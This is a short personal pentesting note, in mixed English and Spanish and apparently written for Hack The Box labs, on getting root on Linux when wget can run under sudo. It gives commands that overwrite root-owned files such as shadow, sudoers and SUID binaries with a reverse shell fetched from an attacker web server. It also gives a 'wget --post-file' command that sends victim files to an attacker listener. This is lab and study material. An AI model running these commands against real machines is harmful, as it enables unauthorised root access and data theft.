## DESCRIPTION
If the machine allows you to run the wget command with the root user you can use it to replace files and run them.

![[Pasted image 20230606133940.png]]


#### Mas información
* https://gtfobins.github.io/gtfobins/wget/
* https://0xdf.gitlab.io/2018/09/29/htb-sunday.html#overwrite-different-suid-binary


## EXPLOITATION

### OPTION 1: 
````

1. There are many possible attacks (to obtain a reverse shell), but the metodology is:

☐ 1º Look up what programming lenguages are used: which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null

☐ 2º Create a reverse shell file.

☐ 3º Enable a Web Server in the same directory where the reverse shell is: python3 -m http.server 80

☐ 4º Using WGET, remplace a root file that you can execute. For example, another binary in sudo -l, a SUID binary, replace root password in shadow (openssl passwd -1 passwordquequeramos), or replace /etc/sudoer/ (su, all. etc): 
sudo wget http://<<IPLOCAL>>/shell.py -O /pathtofile

NOTA: There may be binaries with the SUID active that do not have root as the effective user (we recomend passwd or something with root user (ls -l)).

2. If you onle need to download one file from te victim PC, you can use:

☐ 1º Up a Web Server. NOTE: You cant use PYTHON because it doesnt allow post request. Instead you can use netcat: nca -lvnp 80

☐ 2º Sen the file using post request: sudo wget --post-file=<<PATH TO FILE>> http://<<IP>>/

More information: https://gtfobins.github.io/gtfobins/wget/

````

### OPTION 2 : CREAMOS FICHERO SUDOERS

1. CREAMOS UN FICHERO SUDOERS:
![[Pasted image 20230606134105.png]]

2. LO ENVIAMOS A LA MAQUINA CON → WGET

![[Pasted image 20230606134120.png]]
3. Y YA SOMOS SUDO : SUDO SU

![[Pasted image 20230606134134.png]]

## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 